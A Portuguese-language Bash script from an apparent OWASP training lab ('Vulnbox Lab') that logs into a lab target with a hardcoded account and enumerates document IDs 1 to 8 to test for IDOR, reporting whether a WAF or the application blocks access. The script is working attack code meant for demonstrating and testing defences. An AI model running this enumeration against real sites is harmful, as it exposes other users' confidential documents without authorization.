#!/usr/bin/env bash
# ============================================================
# Vulnbox Lab — Ataque: IDOR em Documentos (A01)
# Acessa documentos confidenciais de outros usuários via ?id=
# ============================================================

TARGET="${TARGET:-http://owasp-lab-sentinel-gateway}"
USERNAME="user1"
PASSWORD="123456"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'
CYN='\033[0;36m'; BLD='\033[1m'; RST='\033[0m'

echo -e "\n${BLD}${CYN}════════════════════════════════════════════════${RST}"
echo -e "${BLD}  🔴 ATAQUE: IDOR em Documentos — OWASP A01${RST}"
echo -e "${CYN}════════════════════════════════════════════════${RST}"
echo -e "  Alvo    : ${TARGET}/document.php"
echo -e "  Usuário : ${USERNAME} (tem acesso apenas ao doc id=5)"
echo -e "${CYN}────────────────────────────────────────────────${RST}\n"

# Login
echo -e "  ${YLW}[1/2] Fazendo login como ${USERNAME}...${RST}"
COOKIE_JAR=$(mktemp /tmp/kali_cookies_XXXXXX.txt)

LOGIN_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "${TARGET}/login.php" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=${USERNAME}&password=${PASSWORD}" \
    -c "$COOKIE_JAR" \
    -L --max-time 10 2>/dev/null)

if [ "$LOGIN_CODE" != "200" ] && [ "$LOGIN_CODE" != "302" ]; then
    echo -e "  ${RED}Falha no login (HTTP ${LOGIN_CODE}).${RST}"
    rm -f "$COOKIE_JAR"
    exit 1
fi
echo -e "  ${GRN}Login OK.${RST}\n"

# Enumeração de documentos
echo -e "  ${YLW}[2/2] Enumerando documentos por ID...${RST}"
echo ""

BLOCKED=0
VULNERABLE_COUNT=0

for DOC_ID in 1 2 3 4 5 6 7 8; do
    RESP=$(curl -s -w "\n%{http_code}" \
        -b "$COOKIE_JAR" \
        "${TARGET}/document.php?id=${DOC_ID}" \
        --max-time 5 2>/dev/null)

    HTTP_CODE=$(echo "$RESP" | tail -1)
    BODY=$(echo "$RESP" | head -n -1)

    if [ "$HTTP_CODE" = "403" ]; then
        if echo "$BODY" | grep -qi "WAF\|gateway\|Sentinel Gateway"; then
            echo -e "  doc_id=${BLD}${DOC_ID}${RST} → ${RED}HTTP 403 — BLOQUEADO PELO WAF 🛡️${RST}"
            BLOCKED=1
            break
        else
            echo -e "  doc_id=${BLD}${DOC_ID}${RST} → ${GRN}HTTP 403 — App negou (corrigido) ✅${RST}"
        fi
    elif [ "$HTTP_CODE" = "200" ]; then
        # Tenta extrair título do documento
        TITLE=$(echo "$BODY" | grep -oP '(?<=<h2>)[^<]+' | head -1 2>/dev/null || echo "")
        if [ -z "$TITLE" ]; then
            TITLE=$(echo "$BODY" | grep -oP '(?<=<title>)[^<]+' | head -1 2>/dev/null || echo "")
        fi
        echo -e "  doc_id=${BLD}${DOC_ID}${RST} → ${RED}HTTP 200 — VULNERÁVEL ⚠️ título: '${TITLE}'${RST}"
        VULNERABLE_COUNT=$((VULNERABLE_COUNT + 1))
    elif [ "$HTTP_CODE" = "404" ]; then
        echo -e "  doc_id=${BLD}${DOC_ID}${RST} → HTTP 404 — documento não encontrado"
    else
        echo -e "  doc_id=${BLD}${DOC_ID}${RST} → HTTP ${HTTP_CODE}"
    fi
    sleep 0.4
done

rm -f "$COOKIE_JAR"

echo ""
echo -e "${CYN}────────────────────────────────────────────────${RST}"
if [ $BLOCKED -eq 1 ]; then
    echo -e "  ${GRN}${BLD}RESULTADO: WAF BLOQUEOU a enumeração IDOR ✅${RST}"
elif [ $VULNERABLE_COUNT -gt 1 ]; then
    echo -e "  ${RED}${BLD}RESULTADO: VULNERÁVEL — ${VULNERABLE_COUNT} documentos acessíveis ⚠️${RST}"
    echo -e "  Documentos confidenciais de outros usuários expostos"
else
    echo -e "  ${GRN}${BLD}RESULTADO: App negou acessos não autorizados ✅${RST}"
fi
echo -e "${CYN}════════════════════════════════════════════════${RST}\n"

